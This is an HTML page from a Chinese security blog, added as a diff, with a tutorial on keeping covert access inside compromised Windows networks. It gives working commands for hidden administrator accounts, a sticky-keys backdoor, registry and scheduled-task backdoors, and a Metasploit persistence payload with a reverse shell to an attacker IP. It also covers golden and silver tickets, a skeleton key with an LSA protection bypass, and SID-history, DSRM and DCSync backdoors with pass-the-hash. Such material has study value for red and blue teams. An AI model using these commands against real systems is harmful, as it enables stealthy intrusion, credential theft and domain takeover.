@@ -1,0 +1,593 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BigCircle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="内网权限维持创建隐藏账户创建账户是最容易的方式也是最容易被发现的方式。所以为了防止被发现，我们要创建一个隐藏账户使用如下命令创建一个隐藏账户，并将该用户加入管理员组 12net user test$ Li12345 &#x2F;addnet localgroup administrators test$ &#x2F;add 此时使用net user 命令是无法发现此账号的但是在计算机管理和注册表中还是可以发现此隐藏账">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网权限维持">
+<meta property="og:url" content="http://example.com/cll9ph78i000ii8ut1oj4amkk/index.html">
+<meta property="og:site_name" content="BigCircle-sec&#39;s Blog">
+<meta property="og:description" content="内网权限维持创建隐藏账户创建账户是最容易的方式也是最容易被发现的方式。所以为了防止被发现，我们要创建一个隐藏账户使用如下命令创建一个隐藏账户，并将该用户加入管理员组 12net user test$ Li12345 &#x2F;addnet localgroup administrators test$ &#x2F;add 此时使用net user 命令是无法发现此账号的但是在计算机管理和注册表中还是可以发现此隐藏账">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333031410-6cf6cfe6-28f3-437b-990b-acf3b145f7cc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333724286-b537f2bc-ef70-45a3-8b06-18f3567056bd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333638106-843c6c2e-3c15-49f8-addc-d6b6f15ec8a9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333838290-47b78f5e-40da-46a6-9f5a-23325c0e4a12.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333896901-84fd5401-030f-4dd2-86b4-b3a6127e9aa6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334032565-813c9184-16cf-4cdb-ac09-b87447a540e1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334149191-f08359c4-3e86-4670-acee-2f8ee1ddf3ef.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334363843-3d02a01c-e6f1-47bc-84ed-4669a20bc668.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663339532887-02af5f35-d130-4244-bdd1-be7bbc69b3da.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663596587842-59985cfc-5e57-429d-a55d-16a399b4239d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663424047415-319574f6-f8ca-4d07-9277-8f85969613a4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663429447304-95529f9f-8242-4370-8b8c-4e7692335676.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663576135966-69777385-1651-4fd4-a280-758c6be0e153.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663576156784-2841607f-961d-4860-b9d4-40b12ea0bb18.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860111519-b8f41f68-0c1c-4a49-9a3d-7c2e0be7d6f1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860400232-21669504-aec2-43c5-9a66-4f4d1ec014da.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860455955-234001ac-ece5-4418-9591-3dbf955dd732.png">
+<meta property="article:published_time" content="2023-08-13T16:33:09.464Z">
+<meta property="article:modified_time" content="2023-08-13T16:47:41.695Z">
+<meta property="article:author" content="BigCircle">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333031410-6cf6cfe6-28f3-437b-990b-acf3b145f7cc.png">
+  
+  
+  
+  <title>内网权限维持 - BigCircle-sec&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BigCircle-sec&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网权限维持"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网权限维持</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="内网权限维持"><a href="#内网权限维持" class="headerlink" title="内网权限维持"></a>内网权限维持</h1><h2 id="创建隐藏账户"><a href="#创建隐藏账户" class="headerlink" title="创建隐藏账户"></a>创建隐藏账户</h2><p>创建账户是最容易的方式也是最容易被发现的方式。所以为了防止被发现，我们要创建一个隐藏账户<br>使用如下命令创建一个隐藏账户，并将该用户加入管理员组</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> user test$ Li12345 /add<br><span class="hljs-built_in">net</span> localgroup administrators test$ /add<br></code></pre></td></tr></table></figure>
+<p>此时使用net user 命令是无法发现此账号的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333031410-6cf6cfe6-28f3-437b-990b-acf3b145f7cc.png" srcset="/img/loading.gif" lazyload><br>但是在计算机管理和注册表中还是可以发现此隐藏账户的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333724286-b537f2bc-ef70-45a3-8b06-18f3567056bd.png" srcset="/img/loading.gif" lazyload><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333638106-843c6c2e-3c15-49f8-addc-d6b6f15ec8a9.png" srcset="/img/loading.gif" lazyload><br>现在我们需要将此后门账户进一步隐藏<br>在注册表中的Names中找到Administrator，点击后记录下类型值，在Users下找到类型值相对的项<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333838290-47b78f5e-40da-46a6-9f5a-23325c0e4a12.png" srcset="/img/loading.gif" lazyload><br>点击Users下的000001F4获取其f的键值，将其复制下来<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663333896901-84fd5401-030f-4dd2-86b4-b3a6127e9aa6.png" srcset="/img/loading.gif" lazyload><br>同样的操作找到test$的f键值，将Administrator的f键值复制进去。之后将test$项和与其类型值相同的项导出<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334032565-813c9184-16cf-4cdb-ac09-b87447a540e1.png" srcset="/img/loading.gif" lazyload><br>导出后使用net user test$ &#x2F;del 命令删除此用户<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334149191-f08359c4-3e86-4670-acee-2f8ee1ddf3ef.png" srcset="/img/loading.gif" lazyload><br>之后打开注册表，将刚刚导出的两个注册表项导入<br>此时只能在注册表中看见隐藏用户，计算机管理中无法发现此隐藏用户<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663334363843-3d02a01c-e6f1-47bc-84ed-4669a20bc668.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h2><p>粘滞键是为了照顾残疾人而设计的，连续按五次shift键即可调出粘滞键设置界面<br>如果 我们可以把粘滞键设置界面更改为cmd.exe即可在不登录的情况下通过粘滞键调出cmd。效果如下图：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663339532887-02af5f35-d130-4244-bdd1-be7bbc69b3da.png" srcset="/img/loading.gif" lazyload><br>粘滞键调出的exe的位置为C:\windows\system32\sethc.exe<br>使用下面的命令进行替换：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\windows\system32\<br><span class="hljs-built_in">move</span> sethc.exe sethc.exe.bak<br><span class="hljs-built_in">copy</span> <span class="hljs-built_in">cmd</span>.exe sethc.exe<br></code></pre></td></tr></table></figure>
+<p>不过在一些做了防护的主机上，即使是SYSTEM权限也是无法修改sethc.exe的。只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p>
+<p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p>
+<p>以msf为例 假设我们已经取得了 目标机器的administrator权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">getsystem                        #提权至system不然窃取进程时可能会出错<br>shell                                  #进入cmd<br>sc.exe TrustedInstaller # 启动TrustedInstaller.exe，此时返回框会获取到TrustedInstaller.exe的pid值<br>exit                                   #退出cmd<br>steal_token &lt;pid&gt;          #窃取进程<br>之后就可以替换sethc.exe了<br>除了上述方法外还可以使用empire的模块：<br>usemodule lateral_movement/invoke_wmi_debugger<br>set ComputerName &lt;主机名/IP&gt;<br>set TargetBinary sethc.exe<br>execute<br></code></pre></td></tr></table></figure>
+<h2 id="注册表后门"><a href="#注册表后门" class="headerlink" title="注册表后门"></a>注册表后门</h2><p>此方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。<br>一般我们使用注册表的如下位置：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   // 开启时启动程序</code><br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit   // 登录时启动程序</code><br>在msf中进行下列操作：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key<br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值<br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v backdoor   #查看键值<br></code></pre></td></tr></table></figure>
+<p>其中backdoor是提前生成并上传的后门</p>
+<p>也可以使用msf自带的模块，Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129  run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129<br></code></pre></td></tr></table></figure>
+<h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><h3 id="at计划任务后门"><a href="#at计划任务后门" class="headerlink" title="at计划任务后门"></a>at计划任务后门</h3><p><code>at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</code><br>在每个工作日的15：01执行后门，不过at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了</p>
+<h3 id="schtasks后门"><a href="#schtasks后门" class="headerlink" title="schtasks后门"></a>schtasks后门</h3><p><code>schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\backdoor.exe /ru system /f</code><br>每隔一分钟执行一次后门</p>
+<h2 id="内网域控权限维持"><a href="#内网域控权限维持" class="headerlink" title="内网域控权限维持"></a>内网域控权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据是通过使用krbtgt用户的ntlm hash伪造TGT实现的。<br>首先在域控中获取krbtgt的ntlm hash和sid：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure>
+<p>获取到后在任意一台域内主机执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kerberos::golden <span class="hljs-regexp">/user:administrator /</span>domain:domain_name <span class="hljs-regexp">/sid:SID /</span>krbtgt:KRBTGT_NTLMHASH<br></code></pre></td></tr></table></figure>
+<p>经过上面的命令可以获得一张票据 ticket.kirbi，再使用mimikatz将此票据注入内存</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptt ticker.kirbi<br></code></pre></td></tr></table></figure>
+<p>此时黄金票据成功注入内存，使用dir \主机名\c$ 即可访问域控的c盘<br>此处需要注意的是要使用主机名而不是ip，这是因为使用ip时使用的是NTLM协议，使用主机名时使用的是kerberos协议，而黄金票据伪造的是kerberos协议中的TGT票据</p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是通过服务账号的ntlmhash伪造st实现权限维持的<br>首先在域控主机上执行</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+<p>获取域控上的计算机账号的hash<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663596587842-59985cfc-5e57-429d-a55d-16a399b4239d.png" srcset="/img/loading.gif" lazyload><br>之后在任意一台域内主机使用mimikatz执行下面命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">kerberos::<span class="hljs-title">golden</span> /<span class="hljs-title">domain:DEMO</span>.<span class="hljs-title">com</span> /<span class="hljs-title">sid:S</span>-1-5-21-979886063-1111900045-1414766810 /<span class="hljs-title">target:WIN</span>-<span class="hljs-title">ENS2VR5TR3N.DEMO.com</span> /<span class="hljs-title">rc4:f0954d00b21d338aa86051eca90f7f74</span> /<span class="hljs-title">service:cifs</span> /<span class="hljs-title">user:douser</span> /<span class="hljs-title">ptt</span></span><br></code></pre></td></tr></table></figure>
+<p>使用dir \主机名\c$ 即可访问域控的c盘<br>此处需要注意的是要使用主机名而不是ip，这是因为使用ip时使用的是NTLM协议，使用主机名时使用的是kerberos协议，而黄金票据伪造的是kerberos协议中的ST票据</p>
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>使用方法：<code>misc::skeleton</code><br>执行上述命令后域内所有账户都会被添加一个“额外密码” ——-mimikatz  ，此时账号的原密码也可以登录，使用mimikatz也可以登录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663424047415-319574f6-f8ca-4d07-9277-8f85969613a4.png" srcset="/img/loading.gif" lazyload><br>此种方法是通过注入了lsass.exe进程实现的，所以在重启之后会失效<br>微软在2014年提供了一个LSA保护策略<br>可以通过查看注册表中是否存在RunAsPPL项且值为1来判断是否开启了LSA（为0则开启了）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663429447304-95529f9f-8242-4370-8b8c-4e7692335676.png" srcset="/img/loading.gif" lazyload><br>在此策略开启的情况下，mimikatz无法对lsass.exe进程进行注入。可以通过下面的而方式绕过LSA保护策略</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># privilege::debug </span><br>mimikatz <span class="hljs-comment"># !+ </span><br>mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe /remove </span><br>mimikatz <span class="hljs-comment"># misc::skeleton</span><br></code></pre></td></tr></table></figure>
+<h3 id="sid-history后门"><a href="#sid-history后门" class="headerlink" title="sid-history后门"></a>sid-history后门</h3><p>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。<br>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。<br>首先需要打开一个具有域管理员权限的cmd窗口，在这个cmd窗口中执行如下命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz # privilege::debug <br>mimikatz # sid::patch <br>mimikatz # sid::add /sam:hack /new:administrator<br></code></pre></td></tr></table></figure>
+<p>其中hack为后门用户，可以自己创建一个新的域用户，也可是域中其他用户<br>执行后登录该账户，已经可以访问域控的目录（dir \192.168.3.21\c$）</p>
+<h3 id="dsrm后门"><a href="#dsrm后门" class="headerlink" title="dsrm后门"></a>dsrm后门</h3><p>目录服务恢复模式(DSRM，Directory Services Restore Mode)，是Windows服务器域控制器的安全模式启动选项。域控制器的本地账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。我们可以通过修改dsrm密码来实现dsrm后门<br>使用下面的命令可以修改dsrm密码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ntdsutil<br><span class="hljs-keyword">set</span> dsrm <span class="hljs-keyword">password</span><br>sync <span class="hljs-keyword">from</span> <span class="hljs-keyword">domain</span> account &lt;account_name&gt;<br>q<br>q<br></code></pre></td></tr></table></figure>
+<p>之后还要修改dsrm的登陆方式，dsrm有三种登陆方式<br>● 0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号<br>● 1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器<br>● 2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器<br>我们需要将该值设置为2<br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2</code><br>或者<code>New-ItemProperty “hklm:\system\currentcontrolset\control\lsa\”-name“dsrmadminlogonbehavior” -value 2 -propertyType DWORD</code><br>之后就可以使用刚刚同步后的hash值进行pth攻击，需要注意的是domain后接的是dc的主机名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /domain:owa2010cn-god /user:Administrator /ntlm:518b98ad4178a53695dc997aa02d455c<br></code></pre></td></tr></table></figure>
+<p>在弹出的cmd界面使用dir可以访问相应目录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663576135966-69777385-1651-4fd4-a280-758c6be0e153.png" srcset="/img/loading.gif" lazyload><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663576156784-2841607f-961d-4860-b9d4-40b12ea0bb18.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="DCSync后门"><a href="#DCSync后门" class="headerlink" title="DCSync后门"></a>DCSync后门</h3><p>DCSync是域中用于不同DC之间同步数据的一种方式。我们可以利用mimikatz伪造一个恶意的DC服务器向真正的DC发送同步数据请求，从而获取ntds.dit，获取域内用户的hash<br>不过DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的<br>但是DCSync并不是所有域内用户都有权限进行此操作的。只有Administrator，Domain Controller，组内的用户<br>但是我们可以通过修改ACL为普通域内用户添加此权限，使得普通用户也可以执行DCSync<br>添加权限使用powerview.ps1进行<br>具体做法就是为普通域用户添加三条 ACE 访问控制项：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DS</span>-Replication-Get-Changes（GUID:<span class="hljs-number">1131</span>f6aa-<span class="hljs-number">9</span>c07-<span class="hljs-number">11</span>d1-f79f-<span class="hljs-number">00</span>c04fc2dcd2）<br><span class="hljs-attribute">DS</span>-Replication-Get-Changes-<span class="hljs-literal">All</span>（GUID:<span class="hljs-number">1131</span>f6ad-<span class="hljs-number">9</span>c07-<span class="hljs-number">11</span>d1-f79f-<span class="hljs-number">00</span>c04fc2dcd2）<br><span class="hljs-attribute">DS</span>-Replication-Get-Changes（GUID:<span class="hljs-number">89</span>e95b76-<span class="hljs-number">444</span>d-<span class="hljs-number">4</span>c62-<span class="hljs-number">991</span>a-<span class="hljs-number">0</span>facbeda640c）<br></code></pre></td></tr></table></figure>
+<p>我们可以通过 Empire 框架中的 PowerView.ps1 脚本实现：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1<br># 为域用户 whoami 添加以上三条 ACE<br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=whoamianony,DC=org&quot;</span> -PrincipalIdentity whoami -Rights DCSync -<span class="hljs-keyword">Verbose</span><br># 为域用户 whoami 删除以上三条 ACE<br><span class="hljs-keyword">Remove</span>-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=whoamianony,DC=org&quot;</span> -PrincipalIdentity whoami -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>
+<p>之后使用mimikatz导出域内所有用户的信息(包括哈希值)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:whoamianony.org /all    <br>lsadump::dcsync /domain:whoamianony.org /all /csv<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860111519-b8f41f68-0c1c-4a49-9a3d-7c2e0be7d6f1.png" srcset="/img/loading.gif" lazyload><br>除此之外还可以使用runas在其他域内主机如boss上使用dbadmin的身份执行DCSync（boss是没有DCSync权限的）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/noprofile /u</span>ser:god\dbadmin cmd<br></code></pre></td></tr></table></figure>
+<p>在弹出的cmd中执行mimikatz的相关命令即可，不过要注意的是，弹出的cmd只是使用了dbadmin的身份，而不是dbadmin用户的cmd。在这个cmd中使用的所有文件还是boss用户的机器上的文件，所以mimikatz应该存在于boss机器上，查找时也应该按照boss机器的路径查找mimikatz.exe。</p>
+<p>runas弹出的cmd中执行命令:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860400232-21669504-aec2-43c5-9a66-4f4d1ec014da.png" srcset="/img/loading.gif" lazyload></p>
+<p>boss用户机器中的cmd中执行命令:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22893576/1663860455955-234001ac-ece5-4418-9591-3dbf955dd732.png" srcset="/img/loading.gif" lazyload><br>如上图中所示，ipconfig的结果仍是boss用户机器的结果</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/cll9ph78k000mi8utg7fh37vt/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
